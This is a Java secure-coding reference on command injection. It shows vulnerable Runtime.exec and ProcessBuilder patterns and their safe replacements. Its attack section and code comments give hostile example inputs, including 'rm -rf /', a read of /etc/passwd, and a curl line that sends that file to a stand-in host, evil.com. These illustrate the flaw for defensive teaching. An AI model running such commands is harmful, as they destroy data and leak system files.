# Command Injection Prevention Reference

## The Attack

Attacker injects OS commands through user input passed to system command execution.

```
Input: report.pdf; rm -rf /
Input: 127.0.0.1 && cat /etc/passwd
Input: file.txt | curl http://evil.com/steal?data=$(cat /etc/passwd)
```

## Vulnerable Patterns

### Runtime.exec with String
```java
// VULNERABLE: Shell interprets metacharacters
String filename = request.getParameter("file");
Runtime.getRuntime().exec("convert " + filename + " output.pdf");
// Input: "file.pdf; rm -rf /" → executes both commands
```

### ProcessBuilder with Shell
```java
// VULNERABLE: Invoking shell with user input
String host = request.getParameter("host");
new ProcessBuilder("sh", "-c", "ping -c 1 " + host).start();
// Input: "8.8.8.8; cat /etc/passwd" → command injection
```

### Script Execution
```java
// VULNERABLE: User input in script arguments
String param = request.getParameter("param");
new ProcessBuilder("bash", "/opt/scripts/process.sh", param).start();
// If script does: eval "$1" or uses $1 unquoted → injection
```

## Prevention

### Avoid System Commands When Possible
```java
// Instead of: Runtime.exec("ping " + host)
// Use Java libraries:
InetAddress address = InetAddress.getByName(host);
boolean reachable = address.isReachable(5000);

// Instead of: Runtime.exec("convert image.pdf ...")
// Use Java libraries: Apache PDFBox, iText, etc.

// Instead of: Runtime.exec("zip ...")
// Use java.util.zip
```

### If Commands Are Necessary — Use Array Form
```java
// SAFE: Array form, no shell interpretation
String filename = sanitizeFilename(userInput);
ProcessBuilder pb = new ProcessBuilder("convert", filename, "output.pdf");
// Each argument is a separate token — no shell metacharacter interpretation
pb.start();
```

### Input Validation
```java
public String validateHostname(String input) {
    // Strict allowlist pattern
    if (!input.matches("^[a-zA-Z0-9][a-zA-Z0-9.-]{0,253}[a-zA-Z0-9]$")) {
        throw new BadRequestException("Invalid hostname");
    }
    return input;
}

public String sanitizeFilename(String input) {
    // Remove everything except safe chars
    String safe = input.replaceAll("[^a-zA-Z0-9._-]", "");
    if (safe.isEmpty()) throw new BadRequestException("Invalid filename");
    return safe;
}
```

### Secure ProcessBuilder Wrapper
```java
public class SafeCommand {

    private static final Duration DEFAULT_TIMEOUT = Duration.ofSeconds(30);

    public static String execute(List<String> command, Duration timeout) {
        // Never pass through shell
        ProcessBuilder pb = new ProcessBuilder(command);
        pb.redirectErrorStream(true);

        // Restrict environment
        pb.environment().clear();
        pb.environment().put("PATH", "/usr/bin:/bin");

        Process process = pb.start();
        boolean finished = process.waitFor(timeout.toMillis(), TimeUnit.MILLISECONDS);

        if (!finished) {
            process.destroyForcibly();
            throw new TimeoutException("Command timed out");
        }

        if (process.exitValue() != 0) {
            throw new CommandException("Command failed: exit " + process.exitValue());
        }

        return new String(process.getInputStream().readAllBytes(), UTF_8);
    }
}
```

## Quick Reference

| Do | Don't |
|----|-------|
| Use Java libraries instead of shell commands | `Runtime.exec(string)` with user input |
| Array form: `new ProcessBuilder("cmd", "arg1", "arg2")` | String form: `"cmd " + userInput` |
| Strict input validation (allowlist) | Blacklist shell metacharacters |
| Timeout and resource limits | Unbounded process execution |
| Minimal environment variables | Inherit full environment |
